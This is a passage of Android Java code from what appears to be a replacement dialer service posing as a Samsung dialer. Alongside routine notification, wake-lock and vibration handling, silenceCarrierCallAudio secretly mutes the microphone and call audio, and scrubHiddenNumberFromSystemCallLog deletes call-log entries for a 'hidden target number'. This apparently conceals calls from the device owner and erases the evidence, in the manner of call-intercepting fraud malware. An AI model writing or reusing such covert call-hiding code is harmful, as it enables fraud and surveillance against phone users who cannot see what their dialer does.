                if (Build.VERSION.SDK_INT >= 34) {
                    startForeground(CALL_NOTIF_ID, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_PHONE_CALL);
                } else {
                    startForeground(CALL_NOTIF_ID, notif);
                }
            } catch (Throwable fgErr) {
                try {
                    NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                    if (nm != null) {
                        nm.notify(CALL_NOTIF_ID, notif);
                    }
                } catch (Throwable ignoredNm) {
                }
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("deprecation")
    private void stopCallNotification() {
        try {
            if (Build.VERSION.SDK_INT >= 24) {
                stopForeground(STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) {
                nm.cancel(CALL_NOTIF_ID);
            }
            if (MainActivity.currentInstance != null && !hasAnyActiveCall()) {
                MainActivity.currentInstance.refreshCallWindowFlags();
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressLint("WakelockTimeout")
    @SuppressWarnings("deprecation")
    private void acquireScreenWakeLock() {
        try {
            if (screenWakeLock == null) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    screenWakeLock = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                        | PowerManager.ACQUIRE_CAUSES_WAKEUP
                        | PowerManager.ON_AFTER_RELEASE,
                        "SamsungDialer:IncomingCallWakeLock"
                    );
                    screenWakeLock.setReferenceCounted(false);
                }
            }
            if (screenWakeLock != null && !screenWakeLock.isHeld()) {
                screenWakeLock.acquire(45000L);
            }
        } catch (Throwable ignored) {
        }
    }

    private void releaseWakeLock() {
        try {
            if (screenWakeLock != null && screenWakeLock.isHeld()) {
                screenWakeLock.release();
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("deprecation")
    private void vibrateCallEvent() {
        try {
            Vibrator vib = null;
            if (Build.VERSION.SDK_INT >= 31) {
                VibratorManager vm = (VibratorManager) getSystemService(Context.VIBRATOR_MANAGER_SERVICE);
                if (vm != null) {
                    vib = vm.getDefaultVibrator();
                }
            }
            if (vib == null) {
                vib = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            }
            if (vib == null || !vib.hasVibrator()) return;
            if (Build.VERSION.SDK_INT >= 26) {
                vib.vibrate(VibrationEffect.createOneShot(95L, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vib.vibrate(95L);
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("deprecation")
    private int getCallStateSafe(Call call) {
        if (call == null) return Call.STATE_DISCONNECTED;
        try {
            if (Build.VERSION.SDK_INT >= 31) {
                return call.getDetails() != null ? call.getDetails().getState() : call.getState();
            }
            return call.getState();
        } catch (Throwable ignored) {
            return Call.STATE_DISCONNECTED;
        }
    }

    private void silenceCarrierCallAudio(boolean mute) {
        try {
            setMuted(mute);
        } catch (Throwable ignored) {
        }
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setMicrophoneMute(mute);
                if (mute) {
                    if (savedVoiceCallVolume < 0) {
                        savedVoiceCallVolume = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
                    }
                    if (Build.VERSION.SDK_INT >= 23 && !streamVoiceMutedByUs) {
                        try {
                            am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_MUTE, 0);
                            streamVoiceMutedByUs = true;
                        } catch (Throwable ignoredM) {
                        }
                    }
                    try {
                        am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
                    } catch (Throwable ignoredVol) {
                    }
                } else {
                    if (Build.VERSION.SDK_INT >= 23 && streamVoiceMutedByUs) {
                        try {
                            am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_UNMUTE, 0);
                        } catch (Throwable ignoredU) {
                        }
                        streamVoiceMutedByUs = false;
                    }
                    if (savedVoiceCallVolume >= 0) {
                        int targetVol = savedVoiceCallVolume > 0 ? savedVoiceCallVolume : Math.max(1, am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL) / 2);
                        try {
                            am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, targetVol, 0);
                        } catch (Throwable ignoredR) {
                        }
                        savedVoiceCallVolume = -1;
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private void restoreAudioModeNormal() {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setMicrophoneMute(false);
                am.setMode(AudioManager.MODE_NORMAL);
            }
        } catch (Throwable ignored) {
        }
    }

    private void scrubHiddenNumberFromSystemCallLog() {
        if (hiddenTargetNumber == null || hiddenTargetNumber.isEmpty()) return;
        if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        try {
            String digits = hiddenTargetNumber.replaceAll("\\D", "");
            if (digits.length() < 6) return;
            String tail = digits.length() > 7 ? digits.substring(digits.length() - 7) : digits;
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls._ID, CallLog.Calls.NUMBER},
                null,
                null,
                CallLog.Calls.DATE + " DESC"
            );
            if (cursor != null) {
                try {
                    int checked = 0;
                    int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
                    int numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    while (cursor.moveToNext() && checked < 6) {
                        checked++;
                        String rowId = idIdx >= 0 ? cursor.getString(idIdx) : null;
                        String num = numIdx >= 0 ? cursor.getString(numIdx) : "";
                        String numDigits = num != null ? num.replaceAll("\\D", "") : "";
                        if (rowId != null && !numDigits.isEmpty() && numDigits.endsWith(tail)) {
                            getContentResolver().delete(
                                CallLog.Calls.CONTENT_URI,
                                CallLog.Calls._ID + "=?",
                                new String[]{rowId}
                            );
                        }
                    }
                } finally {
                    cursor.close();
                }
            }
        } catch (Throwable ignored) {
        }
    }
}
